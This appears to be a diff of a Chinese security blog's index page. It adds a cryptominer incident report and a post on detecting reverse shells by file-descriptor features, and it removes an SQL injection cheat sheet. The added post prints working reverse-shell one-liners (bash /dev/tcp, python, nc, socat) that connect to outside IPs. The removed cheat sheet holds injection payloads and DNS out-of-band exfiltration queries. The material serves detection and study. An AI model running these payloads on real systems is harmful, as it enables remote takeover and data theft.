@@ -259,7 +259,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/07/03/Summary_of_interview_knowledge/">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/07/06/Summary_of_interview_knowledge/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="">
@@ -278,7 +278,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2021/07/03/Summary_of_interview_knowledge/" itemprop="url">安全运营工程师面试知识点汇总</a></h1>
+                <a class="post-title-link" href="/2021/07/06/Summary_of_interview_knowledge/" itemprop="url">安全运营工程师面试知识点汇总</a></h1>
         
 
         <div class="post-meta">
@@ -290,8 +290,8 @@
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2021-07-03T23:43:27+08:00">
-                2021-07-03
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2021-07-06T18:00:20+08:00">
+                2021-07-06
               </time>
             
 
@@ -313,8 +313,8 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E5%AE%89%E5%85%A8/" itemprop="url" rel="index">
-                    <span itemprop="name">安全</span>
+                  <a href="/categories/%E9%9D%A2%E7%BB%8F/" itemprop="url" rel="index">
+                    <span itemprop="name">面经</span>
                   </a>
                 </span>
 
@@ -881,6 +881,167 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2020/10/16/office-miner-events/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="欣海余诚's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/10/16/office-miner-events/" itemprop="url">办公网挖矿病毒事件调查</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-10-16T10:35:22+08:00">
+                2020-10-16
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/" itemprop="url" rel="index">
+                    <span itemprop="name">应急响应</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="事件背景"><a href="#事件背景" class="headerlink" title="事件背景"></a>事件背景</h2><p>10月14日上午查看山石网科设备威胁日志时发现，ip为192.168.60.120的主机存在挖矿行为。</p>
+<p><img src="1.png" alt="image"></p>
+<p>经在微步查询，178.128.242.134为矿池地址，确认为挖矿事件。</p>
+<p><img src="2.png" alt="image"></p>
+<h2 id="事件调查及处理"><a href="#事件调查及处理" class="headerlink" title="事件调查及处理"></a>事件调查及处理</h2><p>确认为挖矿事件后，安全第一时间联系IT同事定位192.168.60.120地址对应的员工，并封禁该员工的上网权限，联系该同事使用ESET对系统进行全盘杀毒。</p>
+<p>据该员工反馈，192.168.60.120是申请用于测试的windows10台式机，为方便外网访问，在该电脑上安装了Zero Tier、花生壳等内网穿透软件，没有开启ESET杀毒软件，于近两日发现电脑运行缓慢。</p>
+<p>10月15日，再次查看山石网科设备威胁日志时发现，192.168.60.120仍存在与矿池通信的行为。</p>
+<p><img src="3.png" alt="image"></p>
+<p>于是安全直接联系该同事，对其电脑进行检查。</p>
+<p>根据最早告警时间，定位到病毒运行时间为2020/10/12 02:05左右。搜索该时间段新创建的文件，发现有很多exe文件，经微步和VT扫描有四个文件均为病毒，已用杀毒软件进行隔离或删除。</p>
+<p>查看windows系统日志，发现最早于2020/10/12 2:04分，电脑上安装了sqlbrowsers服务并设置为了自启动，对应的服务文件conhost.exe文件即为病毒文件。</p>
+<p><img src="4.png" alt="image"></p>
+<p>Application日志中存在病毒启动记录：</p>
+<p><img src="5.png" alt="image"></p>
+<p>查看windows安全日志，发现从2020/10/11 21:03起，有很多Logon登录审核失败的事件，可以看出是攻击者在尝试爆破用户名密码。</p>
+<p><img src="6.png" alt="image"></p>
+<p><img src="7.png" alt="image"></p>
+<p>攻击者最终爆破成功，登录系统种植挖矿病毒。</p>
+<p>这里爆破地址是127.0.0.1，原因是花生壳将电脑本地的3389端口转发至了公网，攻击者访问这个公网地址，相当于直接访问到了受害主机上的花生壳客户端，因此登录地址被识别为127.0.0.1。</p>
+<h2 id="事件结论"><a href="#事件结论" class="headerlink" title="事件结论"></a>事件结论</h2><p>该员工通过在本机电脑上安装花生壳软件，将本地3389端口转发至花生壳公网地址，导致3389端口可被公网任意访问，最终导致被攻击者爆破口令登入系统，种植了挖矿病毒。</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://example.com/2020/09/22/blindsql-injection-poc/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1266,6 +1427,195 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2020/06/03/reverse-shell-feature-research/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="欣海余诚's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/06/03/reverse-shell-feature-research/" itemprop="url">反弹shell特征研究</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-06-03T22:10:59+08:00">
+                2020-06-03
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/" itemprop="url" rel="index">
+                    <span itemprop="name">应急响应</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>从hids的角度出发，看反弹shell的特征。</p>
+<p>最简单的，可以根据进程黑名单直接监测到一些反弹shell，如<code>nc</code>、<code>socat</code>、<code>bash -i &gt;&amp; /dev/tcp/xxx/xxx</code>。这种检测也是很好绕过的，给可执行文件的名字换了即可。</p>
+<p>所以这次学习一下通用的反弹shell检测方式——文件描述符重定向。</p>
+<h2 id="特征1-所有文件描述符重定向至远程socket"><a href="#特征1-所有文件描述符重定向至远程socket" class="headerlink" title="特征1. 所有文件描述符重定向至远程socket"></a>特征1. 所有文件描述符重定向至远程socket</h2><h3 id="bash-i"><a href="#bash-i" class="headerlink" title="bash -i"></a>bash -i</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.7.61/7777 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+<p>创建了一个常住进程”bash -i”， 012文件描述符都被重定向至远程socket链接。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">pauser@ubuntu:~$ ps -ef| grep bash</span><br><span class="line">pauser    11509  11502  0 08:35 pts/2    00:00:00 bash</span><br><span class="line">pauser    11547  11509  0 08:36 pts/2    00:00:00 bash -i</span><br><span class="line">pauser    11557  11502  0 08:36 pts/18   00:00:00 bash</span><br><span class="line">pauser    11648  11557  0 08:39 pts/18   00:00:00 grep --color=auto bash</span><br><span class="line">pauser@ubuntu:~$ ls -l /proc/11547/fd</span><br><span class="line">total 0</span><br><span class="line">lrwx------ 1 pauser pauser 64 Jun 17 08:36 0 -&gt; socket:[824338]</span><br><span class="line">lrwx------ 1 pauser pauser 64 Jun 17 08:36 1 -&gt; socket:[824338]</span><br><span class="line">lrwx------ 1 pauser pauser 64 Jun 17 08:36 2 -&gt; socket:[824338]</span><br><span class="line">lrwx------ 1 pauser pauser 64 Jun 17 08:36 255 -&gt; /dev/tty</span><br><span class="line">pauser@ubuntu:~$ lsof -p 11547</span><br><span class="line">COMMAND   PID   USER   FD   TYPE DEVICE SIZE/OFF   NODE NAME</span><br><span class="line">bash    11547 pauser  cwd    DIR    8,1     4096 281418 /home/pauser</span><br><span class="line">bash    11547 pauser  rtd    DIR    8,1     4096      2 /</span><br><span class="line">bash    11547 pauser  txt    REG    8,1  1037528 393569 /bin/bash</span><br><span class="line">...</span><br><span class="line">bash    11547 pauser    0u  IPv4 824338      0t0    TCP 192.168.71.139:56374-&gt;106.52.206.218:8888 (ESTABLISHED)</span><br><span class="line">bash    11547 pauser    1u  IPv4 824338      0t0    TCP 192.168.71.139:56374-&gt;106.52.206.218:8888 (ESTABLISHED)</span><br><span class="line">bash    11547 pauser    2u  IPv4 824338      0t0    TCP 192.168.71.139:56374-&gt;106.52.206.218:8888 (ESTABLISHED)</span><br><span class="line">bash    11547 pauser  255u   CHR    5,0      0t0     13 /dev/tty</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>lsof: 查看进程打开的文件的工具</p>
+</blockquote>
+<h3 id="python-perl-ruby等脚本语言类反弹shell"><a href="#python-perl-ruby等脚本语言类反弹shell" class="headerlink" title="python/perl/ruby等脚本语言类反弹shell"></a>python/perl/ruby等脚本语言类反弹shell</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#x27;106.52.206.218&#x27;,8888));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#x27;/bin/bash&#x27;,&#x27;-i&#x27;]);&quot;</span><br></pre></td></tr></table></figure>
+
+<p>文件描述符也是都被重定向至远程socket连接.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">pauser@ubuntu:~$ ls -l /proc/45638/fd</span><br><span class="line">total 0</span><br><span class="line">lrwx------ 1 pauser pauser 64 Jun 17 08:51 0 -&gt; socket:[860316]</span><br><span class="line">lrwx------ 1 pauser pauser 64 Jun 17 08:51 1 -&gt; socket:[860316]</span><br><span class="line">lrwx------ 1 pauser pauser 64 Jun 17 08:51 2 -&gt; socket:[860316]</span><br><span class="line">lrwx------ 1 pauser pauser 64 Jun 17 08:51 3 -&gt; socket:[860316]</span><br><span class="line">pauser@ubuntu:~$ lsof -p 45638</span><br><span class="line">COMMAND   PID   USER   FD   TYPE DEVICE SIZE/OFF   NODE NAME</span><br><span class="line">python  45638 pauser  cwd    DIR    8,1     4096 281418 /home/pauser</span><br><span class="line">python  45638 pauser  rtd    DIR    8,1     4096      2 /</span><br><span class="line">python  45638 pauser  txt    REG    8,1  3492624    292 /usr/bin/python2.7</span><br><span class="line">python  45638 pauser  mem    REG    8,1  2366112 263076 </span><br><span class="line">...</span><br><span class="line">python  45638 pauser    0u  IPv4 860316      0t0    TCP 192.168.71.139:56384-&gt;106.52.206.218:8888 (ESTABLISHED)</span><br><span class="line">python  45638 pauser    1u  IPv4 860316      0t0    TCP 192.168.71.139:56384-&gt;106.52.206.218:8888 (ESTABLISHED)</span><br><span class="line">python  45638 pauser    2u  IPv4 860316      0t0    TCP 192.168.71.139:56384-&gt;106.52.206.218:8888 (ESTABLISHED)</span><br><span class="line">python  45638 pauser    3u  IPv4 860316      0t0    TCP 192.168.71.139:56384-&gt;106.52.206.218:8888 (ESTABLISHED)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h3 id="nc-反弹shell"><a href="#nc-反弹shell" class="headerlink" title="nc 反弹shell"></a>nc 反弹shell</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/nc.traditional -e /bin/bash 134.175.2.34 8888</span><br></pre></td></tr></table></figure>
+<p>进程中对应的是bash：</p>
+<p><img src="1.png" alt="image"></p>
+<p>文件描述符：</p>
+<p><img src="2.png" alt="image"></p>
+<h2 id="特征2-通过管道、重定向多次后连接至远程"><a href="#特征2-通过管道、重定向多次后连接至远程" class="headerlink" title="特征2. 通过管道、重定向多次后连接至远程"></a>特征2. 通过管道、重定向多次后连接至远程</h2><h3 id="nc重定向"><a href="#nc重定向" class="headerlink" title="nc重定向"></a>nc重定向</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/nc.traditional 134.175.2.34 8888 | /bin/bash</span><br></pre></td></tr></table></figure>
+<p>根据bash进程定位到文件描述符，发现输入描述符0被重定向至管道：</p>
+<p><img src="3.png" alt="image"></p>
+<p>定位管道另一端的进程nc，该进程文件描述符3连接远程socket连接：</p>
+<p><img src="4.png" alt="image"></p>
+<p>还有一个nc反弹shell命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 110.211.55.2 7777 &gt;/tmp/f</span><br></pre></td></tr></table></figure>
+
+<p>mkfifo 命令首先创建了一个管道，cat 将管道里面的内容输出传递给/bin/sh，sh会执行管道里的命令并将标准<br>输出和标准错误输出结果通过nc 传到该管道，由此形成了一个回路</p>
+<p>定位到sh -i进程：</p>
+<p><img src="51.png" alt="image"></p>
+<p>根据pipe找到nc进程，描述符3重定向至远程socket连接：</p>
+<p><img src="5.png" alt="image"></p>
+<p>总结：</p>
+<p>0，1，2标准输入输出、错误输出流被指向pipe管道，管道指向到另一个进程会有一个对外的socket链接，中间或许经过多层管道，但最终被定向到的进程必有一个socket链接。</p>
+<h2 id="特征3-socat"><a href="#特征3-socat" class="headerlink" title="特征3. socat"></a>特征3. socat</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">反弹命令</span><br><span class="line">socat exec:&#x27;bash -li&#x27;,pty,stderr,setsid,sigint,sane tcp:10.211.55.2:9999</span><br><span class="line">监听命令</span><br><span class="line">socat file:`tty`,raw,echo=0 tcp-listen:9999</span><br></pre></td></tr></table></figure>
+<p>定位文件描述符：</p>
+<p><img src="6.png" alt="image"></p>
+<blockquote>
+<p>SOCK_DGRAM 是无保障的面向消息的socket，主要用于在网络上发广播信息。</p>
+</blockquote>
+<p>bash通过管道与socat进程通信，但是管道并不是重定向的标准输入输出、标准错误输出这三个流，而是其他的流，然后在程序内部再将该pipe管道定向到0，1，2这三个文件描述符。</p>
+<h2 id="其它（待研究）"><a href="#其它（待研究）" class="headerlink" title="其它（待研究）"></a>其它（待研究）</h2><ul>
+<li>MSF生成的python payload</li>
+<li>DNS/ICMP 反弹shell</li>
+</ul>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/anbuxuan/p/11848906.html">基于主机的反弹shell检测思路</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.t00ls.net/viewthread.php?tid=52840&highlight=%E5%8F%8D%E5%BC%B9shell">反弹shell流量分析</a></li>
+</ul>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://example.com/2020/06/02/pwnhub-web-writeup/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1322,17 +1672,6 @@
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                   <a href="/categories/CTF/" itemprop="url" rel="index">
                     <span itemprop="name">CTF</span>
-                  </a>
-                </span>
-
-                
-                
-                  , 
-                
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/CTF/WEB%E5%AE%89%E5%85%A8/" itemprop="url" rel="index">
-                    <span itemprop="name">WEB安全</span>
                   </a>
                 </span>
 
@@ -1854,259 +2193,13 @@ curl直接发起gopher攻击：
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2019/11/20/sql-injection/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="欣海余诚's blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/11/20/sql-injection/" itemprop="url">SQL注入笔记</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-11-20T15:05:44+08:00">
-                2019-11-20
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/WEB%E5%AE%89%E5%85%A8/" itemprop="url" rel="index">
-                    <span itemprop="name">WEB安全</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="0x01-常见注入类型"><a href="#0x01-常见注入类型" class="headerlink" title="0x01 常见注入类型"></a>0x01 常见注入类型</h2><h3 id="一、带回显"><a href="#一、带回显" class="headerlink" title="一、带回显"></a>一、带回显</h3><h4 id="1-联合注入"><a href="#1-联合注入" class="headerlink" title="1. 联合注入"></a>1. 联合注入</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; and 1=1--+   ==&gt;   id=1&#x27; and 1^0--+   ==&gt;  select !0</span><br><span class="line">id=1&#x27; and 1=2--+   ==&gt;   id=1&#x27; and 1^1--+   ==&gt;</span><br><span class="line">1&#x27; and &#x27;1&#x27;=&#x27;1</span><br><span class="line">1&#x27; --+</span><br><span class="line">1&#x27; order by 2 -- -</span><br><span class="line">1&#x27; union select 1,2-- -</span><br><span class="line">注表名</span><br><span class="line">1&#x27; union select database(), group_concat(table_name) from information_schema.tables where table_schema=database()-- -</span><br><span class="line">注列名：</span><br><span class="line">1&#x27; union select table_name, group_concat(column_name) from information_schema.columns where table_name=&#x27;xxx&#x27;-- -;</span><br><span class="line"> select !1</span><br><span class="line">//注flag：</span><br><span class="line">id=-1&#x27;%20union%20select%201,username,password%20from%20security.users--+</span><br></pre></td></tr></table></figure>
-<h4 id="2-报错注入"><a href="#2-报错注入" class="headerlink" title="2.报错注入"></a>2.报错注入</h4><ol>
-<li><p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/e097a1c0d9ef">双查询注入(Duplicate entry报错)</a></p>
- <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; union select 1,count(*),concat_ws(&#x27;:&#x27;,(select group_concat(table_name) from information_schema.tables where table_schema=database()),floor(rand()*2)) as a from information_schema.tables group by a --+</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>group by floor(random(0)*2)出错的原因是key是个随机数，检测临时表中key是否存在时计算了一下floor(random(0)*2)可能为0，如果此时临时表只有key为1的行不存在key为0的行，那么数据库要将该条记录插入临时表，由于是随机数，插时又要计算一下随机值，此时floor(random(0)*2)结果可能为1，就会导致插入时冲突而报错。即检测时和插入时两次计算了随机数的值。</p>
-</blockquote>
-</li>
-<li><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/column/158705.html">Xpath报错</a></p>
-<p> 条件：Mysql&gt;5.1.5</p>
- <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">//updatexml():对xml进行查询和修改</span><br><span class="line">id=1&#x27; and updatexml(1,concat(0x26,(version()),0x26),1)--+</span><br><span class="line">id=1&#x27; and updatexml(1,concat(0x3a,(select username from security.users limit 1)), 1)--+</span><br><span class="line">//extractvalue():对xml进行查询和修改</span><br><span class="line">id=1&#x27; and (extractvalue(1,concat(0x26,(version()),0x26)))--+</span><br><span class="line"></span><br><span class="line">1&#x27; and updatexml(0,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;dvwa&#x27;),0)-- -</span><br><span class="line">1&#x27; and updatexml(1,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;),1)-- -</span><br><span class="line">1&#x27; and extractvalue(0,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;dvwa&#x27;))-- -</span><br></pre></td></tr></table></figure>
-<p> 报错注入只能爆出32位，结合substring爆出64位flag</p>
-</li>
-<li><p><a target="_blank" rel="noopener" href="https://www.lsablog.com/networksec/penetration/error-based-blind-sqli/">整数溢出报错</a></p>
-<p> exp(x):计算e的x次方，需要Mysql&gt;5.5.5</p>
-<p> 原理：Exp()超过710会产生溢出。</p>
-<p> Payload: </p>
- <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; and (EXP(~(select * from(select version())a)))--+ //未试验成功</span><br></pre></td></tr></table></figure></li>
-</ol>
-<h4 id="二、无回显"><a href="#二、无回显" class="headerlink" title="二、无回显"></a>二、无回显</h4><h4 id="1-基于时间"><a href="#1-基于时间" class="headerlink" title="1. 基于时间"></a>1. 基于时间</h4><ul>
-<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/cyjaysun/p/4463979.html">延迟函数</a></li>
-</ul>
-<ol>
-<li><p>Mssql：</p>
-<p> waitfor {DELAY ‘time’ | TIME ‘time’}, time格式为“时:分:秒”。（无sleep函数）</p>
- <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; waitfor delay &#x27;0:0:5&#x27;;--+</span><br></pre></td></tr></table></figure></li>
-<li><p>Mysql：</p>
-<p> BENCHMARK将一个表达式执行许多次：</p>
- <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; and(SELECT BENCHMARK(10000000,ENCODE(&#x27;hello&#x27;,&#x27;mom&#x27;))) and 1=1--+ //BENCHMARK(count, express)</span><br></pre></td></tr></table></figure>
-<p> sleep()函数：</p>
- <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; and(select sleep(5)) and 1=1--+</span><br><span class="line">1&#x27; and if(LENGTH(DATABASE())=13,SLEEP(1),0);</span><br><span class="line">1&#x27; and if(ord(SUBSTRING(user(),1,1))=114,SLEEP(1),0);</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>Postgresql</p>
-<p> 最新版本的PostgreSQL数据库(8.2及以上版本)中，可以使用pg_sleep函数来引起延迟：<code>id=1&#39; and SELECT pg_sleep(10);--+</code></p>
-</li>
-<li><p>Oracle:</p>
-<p> DBMS_PIPE.RECEIVE_MESSAGE函数将为从RDS管道返回的数据等待10秒。默认情况下，允许以public权限执行该包。 </p>
- <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; or 1=dbms_pipe.receive_message(&#x27;RDS&#x27;, 10)--+ //</span><br></pre></td></tr></table></figure></li>
-</ol>
-<h4 id="2-基于bool"><a href="#2-基于bool" class="headerlink" title="2. 基于bool"></a>2. 基于bool</h4><h4 id="3-DNSLOG带外"><a href="#3-DNSLOG带外" class="headerlink" title="3. DNSLOG带外"></a>3. DNSLOG带外</h4><p>mysql的secure_file_priv为空的时候可以使用,版本基本在5.5.53之前。(经测试，5.5.2也不能成功带外)</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select load_file(&quot;////test.hcg10m.dnslog.cn//a.txt&quot;);</span><br><span class="line">select load_file(concat(&quot;////&quot;, version(), &quot;.8em7js.ceye.io//a.txt&quot;));</span><br></pre></td></tr></table></figure>
-
-<h2 id="0x02-如何区分后端数据库"><a href="#0x02-如何区分后端数据库" class="headerlink" title="0x02 如何区分后端数据库"></a>0x02 <a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_34275734/article/details/91816289">如何区分后端数据库</a></h2><h3 id="1-看报错"><a href="#1-看报错" class="headerlink" title="1. 看报错"></a>1. 看报错</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Oracle：</span><br><span class="line">ORA-00933: SQL command not properly ended</span><br><span class="line"></span><br><span class="line">MS SQL Server：</span><br><span class="line">Microsoft SQL Native Client error &#x27;80040e14&#x27;</span><br><span class="line">Unclosed quotation mark after the character string</span><br><span class="line"></span><br><span class="line">PostgreSQL：</span><br><span class="line">Query failed: ERROR: syntax error at or near &quot;&#x27;&quot; at character 56 in /www/site/test.php on line 121.</span><br></pre></td></tr></table></figure>
